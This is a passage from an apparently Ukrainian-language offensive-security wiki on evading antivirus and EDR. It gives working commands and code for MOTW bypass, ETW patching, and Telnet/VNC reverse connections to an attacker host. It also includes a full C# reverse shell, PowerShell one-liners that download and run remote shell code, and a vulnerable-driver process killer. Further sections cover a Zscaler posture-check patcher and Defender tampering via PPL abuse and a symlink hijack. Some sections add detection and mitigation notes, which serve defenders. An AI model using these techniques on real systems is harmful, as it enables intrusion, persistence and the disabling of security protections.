<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що executable files, підписані **trusted** signing certificate, **не активують SmartScreen**.

Дуже ефективний спосіб запобігти отриманню вашими payloads Mark of The Web — упакувати їх у контейнер, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не можна** застосувати до томів, які **не використовують NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payloads у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось демонстрація обходу SmartScreen шляхом пакування payloads усередині ISO-файлів за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу застосункам і системним компонентам **журналювати події**. Однак його також можуть використовувати security products для моніторингу та виявлення шкідливої активності.

Так само як вимикається (обходиться) AMSI, можна змусити функцію **`EtwEventWrite`** процесу user space негайно повертати значення без журналювання будь-яких подій. Для цього функцію патчать у пам’яті, щоб вона одразу повертала значення, фактично вимикаючи журналювання ETW для цього процесу.

Більше інформації можна знайти тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Завантаження C# binaries у пам’ять відоме вже досить давно й досі є чудовим способом запускати свої post-exploitation tools, не потрапляючи у поле зору AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде подбати лише про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) уже підтримують виконання C# assemblies безпосередньо в пам’яті, але існують різні способи це робити:

- **Fork\&Run**

Цей метод передбачає **створення нового sacrificial process**, ін’єкцію вашого шкідливого post-exploitation code у цей процес, виконання шкідливого code і завершення нового процесу після завершення роботи. Це має як переваги, так і недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **за межами** процесу нашого Beacon implant. Це означає, що якщо під час post-exploitation action щось піде не так або буде виявлено, існує **значно вища ймовірність**, що наш **implant залишиться працювати.** Недолік полягає в тому, що існує **вища ймовірність бути виявленим** засобами **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Йдеться про ін’єкцію шкідливого post-exploitation code **у власний процес**. У такий спосіб можна уникнути створення нового процесу та його сканування AV, але недоліком є те, що якщо під час виконання payload щось піде не так, існує **значно вища ймовірність** **втратити beacon**, оскільки він може аварійно завершити роботу.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) і їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **із PowerShell**. Перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати шкідливий code за допомогою інших мов, надавши скомпрометованій машині доступ **до interpreter environment, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries та environment на SMB share, можна **виконувати довільний code цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender усе ще сканує scripts, але завдяки використанню Go, Java, PHP тощо ми маємо **більшу гнучкість для обходу static signatures**. Тестування випадкових необфускованих reverse shell scripts цими мовами виявилося успішним.

## TokenStomping

Token stomping маніпулює access token security product, наприклад EDR або AV. Зменшення привілеїв token може залишити процес запущеним, водночас не дозволяючи йому виконувати привілейовані дії з перевірки або remediation.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати handles до tokens security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного software

### Chrome Remote Desktop

Як описано в [**цьому дописі в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко розгорнути Chrome Remote Desktop на ПК жертви, а потім використовувати його для захоплення контролю над ПК і підтримання persistence:<sup>[[35]](#references)</sup>
1. Завантажте його з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть MSI-файл для Windows, щоб завантажити MSI-файл.
2. Тихо запустіть installer на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть next. Майстер попросить вас авторизуватися; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану команду з необхідними змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` встановлює PIN без використання GUI).


## Advanced Evasion

Evasion — дуже складна тема. Іноді в одній системі потрібно враховувати багато різних джерел telemetry, тому в зрілих середовищах практично неможливо залишатися повністю невиявленим.

Кожне середовище, проти якого ви дієте, матиме власні сильні та слабкі сторони.

Я наполегливо рекомендую переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі techniques**

### **Перевірка, які частини Defender вважає шкідливими**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини binary**, доки **не визначить, яку частину Defender** вважає шкідливою, і повідомить її вам.\
Інший tool, що робить **те саме, —** [**avred**](https://github.com/dobin/avred), з відкритим web-сервісом за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows містили **Telnet server**, який можна було встановити (як адміністратор), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався** під час запуску системи, і **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити порт telnet** (скритність) та вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні bin downloads, а не setup)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **комп'ютер жертви**

#### **Зворотне підключення**

**Атакувальник** повинен **запустити на своєму хості** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC-підключення**. Потім на **комп'ютері жертви**: запустіть daemon winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ПОПЕРЕДЖЕННЯ:** Для збереження непомітності не слід виконувати кілька дій

- Не запускайте `winvnc`, якщо він уже запущений, інакше з'явиться [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи запущений він, за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тому самому каталозі, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для отримання довідки, інакше з'явиться [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Усередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# за допомогою компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання python для створення injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Вимкнення AV/EDR із простору ядра

Storm-2603 використовував невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед розгортанням ransomware. Інструмент містить **власний вразливий, але *підписаний* driver** і зловживає ним для виконання привілейованих операцій у ядрі, які не можуть заблокувати навіть AV-сервіси Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний driver**: файл, доставлений на диск, має назву `ServiceMouse.sys`, але binary є легітимно підписаним driver `AToolsKrnl64.sys` з “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки driver має дійсний підпис Microsoft, він завантажується навіть за ввімкненого Driver-Signature-Enforcement (DSE).
2. **Встановлення service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє driver як **kernel service**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із user land.
3. **IOCTL, які надає driver**
| Код IOCTL | Можливість                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершення довільного process за PID (використовується для завершення service Defender/EDR) |
| `0x990000D0` | Видалення довільного файлу з диска |
| `0x990001D0` | Вивантаження driver і видалення service |

Мінімальний C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**: BYOVD повністю обходить захисти user-mode; code, який виконується в ядрі, може відкривати *захищені* process, завершувати їх або змінювати об’єкти ядра незалежно від PPL/PP, ELAM чи інших функцій hardening.

Виявлення / Mitigation
•  Увімкніть список заблокованих вразливих driver від Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
•  Відстежуйте створення нових *kernel* service та сповіщайте, коли driver завантажується зі world-writable directory або відсутній у allow-list.
•  Відстежуйте handles із user-mode до custom device objects, після яких виконуються підозрілі виклики `DeviceIoControl`.

### Обхід Posture Checks Zscaler Client Connector через patching binary на диску

**Client Connector** від Zscaler локально застосовує правила device-posture та покладається на Windows RPC для передачі результатів іншим компонентам. Два слабкі рішення в дизайні роблять повний bypass можливим:

1. Оцінювання posture відбувається **повністю на стороні client** (на server надсилається boolean).
2. Внутрішні RPC endpoints перевіряють лише те, що connecting executable **підписаний Zscaler** (через `WinVerifyTrust`).<sup>[[11]](#references)</sup>

За допомогою **patching чотирьох підписаних binary на диску** обидва механізми можна нейтралізувати:

| Binary | Виправлена оригінальна логіка | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка вважається compliant |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | NOP-ed ⇒ будь-який (навіть unsigned) process може підключатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks тунелю | Обхід виконання перевірок |

Мінімальний фрагмент patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску service stack:

* **Усі** posture checks відображаються як **green/compliant**.
* Непідписані або змінені binaries можуть відкривати RPC endpoints іменованих каналів (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований host отримує необмежений доступ до internal network, визначеної політиками Zscaler.

Цей case study демонструє, як рішення про довіру, що приймаються виключно на стороні клієнта, і прості перевірки підписів можна обійти за допомогою кількох byte patches.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) застосовує ієрархію signer/level, щоб лише protected processes з таким самим або вищим рівнем могли втручатися один в одного. В offensive-сценаріях, якщо ви можете легітимно запустити PPL-enabled binary і контролювати його arguments, можна перетворити benign functionality (наприклад, logging) на обмежений PPL-backed write primitive для protected directories, які використовуються AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що змушує process працювати як PPL
- Цільовий EXE (і будь-які завантажені DLLs) мають бути підписані за допомогою PPL-capable EKU.
- Process має бути створений за допомогою CreateProcess із flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Необхідно запитати compatible protection level, що відповідає signer binary (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware signers, `PROTECTION_LEVEL_WINDOWS` для Windows signers). Неправильні levels призведуть до помилки під час створення.

Також див. ширший вступ до PP/PPL і LSASS protection тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Open-source helper: CreateProcessAsPPL (вибирає protection level і передає arguments до цільового EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Примітив LOLBIN: ClipUp.exe
- Підписаний системний binary `C:\Windows\System32\ClipUp.exe` самостійно запускає дочірній процес і приймає параметр для запису log-файлу за шляхом, указаним caller.
- Якщо його запущено як процес PPL, запис файлу виконується з підтримкою PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб указати на розташування, які зазвичай захищені.

Помічники для коротких шляхів 8.3
- Перелічити короткі імена: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (абстрактний)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із `CREATE_PROTECTED_PROCESS` за допомогою launcher (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент шляху до log-файлу, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо цільовий binary зазвичай відкритий або заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час boot до запуску AV, установивши auto-start service, який гарантовано запускається раніше. Перевірте порядок запуску під час boot за допомогою Process Monitor (boot logging).
4) Після reboot запис із підтримкою PPL відбувається до того, як AV заблокує свої binaries, пошкоджуючи цільовий файл і запобігаючи запуску.

Приклад invocation (шляхи приховано/скорочено з міркувань безпеки):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Примітки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp; змінювати можна лише розташування, тому примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Потрібні локальні права адміністратора/SYSTEM для встановлення та запуску служби, а також вікно для перезавантаження.
- Час має критичне значення: цільовий файл не повинен бути відкритим; виконання під час завантаження дає змогу уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичайними аргументами, особливо якщо його батьківськими процесами є нестандартні launchers, приблизно під час завантаження.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і стабільний запуск до Defender/AV. Досліджуйте створення/зміни служб перед збоями запуску Defender.
- Моніторинг цілісності файлів бінарних файлів Defender і директорій Platform; несподіване створення/зміна файлів процесами з прапорцями protected-process.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, а також аномальне використання рівня PPL бінарними файлами, що не належать AV.

Пом'якшення
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і від яких батьківських процесів; блокуйте запуск ClipUp поза легітимними контекстами.
- Гігієна служб: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції з порядком запуску.
- Переконайтеся, що захист Defender від tampering і захист на ранньому етапі запуску ввімкнені; досліджуйте помилки запуску, які вказують на пошкодження бінарних файлів.
- Розгляньте можливість вимкнення генерації коротких імен 8.3 на томах, де розміщені security tools, якщо це сумісно з вашим середовищем (ретельно протестуйте).

## Tampering Microsoft Defender через Symlink Hijack папки версії Platform

Windows Defender визначає Platform, з якої він запускається, шляхом перерахування підпапок у:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підпапку з найвищим лексикографічним значенням рядка версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Під час цього вибору система довіряє записам каталогів, зокрема directory reparse points (symlinks). Адміністратор може використати це, щоб перенаправити Defender до шляху, доступного для запису attacker, і досягти DLL sideloading або порушення роботи служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний Administrator (потрібен для створення директорій/symlinks у папці Platform)
- Можливість перезавантажити систему або ініціювати повторний вибір Platform Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані інструменти (`mklink`)

Чому це працює
- Defender блокує запис у власні папки, але під час вибору Platform довіряє записам каталогів і вибирає версію з найвищим лексикографічним значенням, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте доступний для запису clone поточної папки Platform, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть символічне посилання на каталог вищої версії всередині Platform, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Варіанти post-exploitation
- DLL sideloading/code execution: Додайте або замініть DLL, які Defender завантажує з каталогу свого застосунку, щоб виконати code у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink, щоб під час наступного запуску налаштований шлях не визначився, унаслідок чого Defender не запуститься:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зверніть увагу, що ця техніка сама по собі не забезпечує підвищення привілеїв; для її використання потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перенести runtime evasion із C2 implant безпосередньо до цільового модуля, перехопивши його Import Address Table (IAT) і спрямовуючи вибрані API через контрольований атакувальником position-independent code (PIC). Це узагальнює evasion за межами невеликої поверхні API, яку надають багато kit (наприклад, CreateProcessA), і поширює той самий захист на BOFs та post-exploitation DLL.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід високого рівня
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (prepended або companion). PIC має бути самодостатнім і position-independent.
- Під час завантаження host DLL пройдіть її IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasion перед передаванням керування через tail-call до адреси реального API. Типові evasion включають:
- Маскування/розмаскування пам’яті навколо виклику (наприклад, шифрування областей beacon, RWX→RX, зміну назв/дозволів сторінок), а потім відновлення після виклику.
- Call-stack spoofing: створення нешкідливого стека та перехід до цільового API, щоб аналіз call stack визначав очікувані фрейми.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб Aggressor script (або еквівалент) міг реєструвати API, які потрібно перехоплювати для Beacon, BOFs і post-ex DLLs.

Чому тут використовується IAT hooking
- Працює для будь-якого коду, який використовує перехоплений import, без модифікації коду інструмента або залежності від Beacon як proxy для конкретних API.
- Охоплює post-ex DLLs: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати те саме masking/stack evasion до їхніх API-викликів.
- Відновлює надійне використання post-ex команд для створення процесів проти detections на основі call stack, обгортаючи CreateProcessA/W.

Мінімальний ескіз IAT hook (x64 псевдокод C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
